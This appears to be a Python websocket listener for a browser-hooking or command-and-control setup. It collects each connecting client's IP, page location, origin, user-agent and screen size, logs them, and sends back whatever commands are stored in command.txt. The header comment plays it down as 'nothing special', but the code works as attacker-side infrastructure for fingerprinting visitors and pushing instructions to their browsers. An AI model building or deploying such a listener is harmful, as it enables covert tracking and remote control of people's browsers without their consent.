#!/usr/bin/env python3

# Simple websocket server. Nothing special

import asyncio
import websockets
import logging
import json
logging.basicConfig(format='%(asctime)s - %(message)s',filename='socket_track.log', encoding='utf-8', level=logging.INFO)

async def tracker(websocket, path):
    async for message in websocket:
        # Load the JSON data from out client connection
        wData = json.loads(message)
        ip = wData['ip']
        ip = ip.rstrip()
        path = wData['loc']
        h = str(wData['h'])
        w = str(wData['w'])
        print("---NEW CONNECTION---")
        print("[+]Connection from: ",ip)
        print("[+]Origin: ", websocket.request_headers.get('origin'))
        print("[+]Path: ", path)
        print("[+]User-Agent: ", websocket.request_headers.get('user-agent'))
        print("[+]Screen Dimmensions: ",w,"x",h)
        print("---END CONNECTION---")
        data = "Host: "+ip+"\tOrigin: "+websocket.request_headers.get('origin')+"\tUser-Agent: "\
            +websocket.request_headers.get('user-agent')+"\tPath: "+path+\
            "\tHeight: "+h+"\tWidth: "+w
        logging.info(data)
        insData = open('command.txt','r')
        instruction = insData.read()
        insData.close()
        await websocket.send(instruction)
        break
asyncio.get_event_loop().run_until_complete(websockets.serve(tracker, '0.0.0.0', 8080))
asyncio.get_event_loop().run_forever()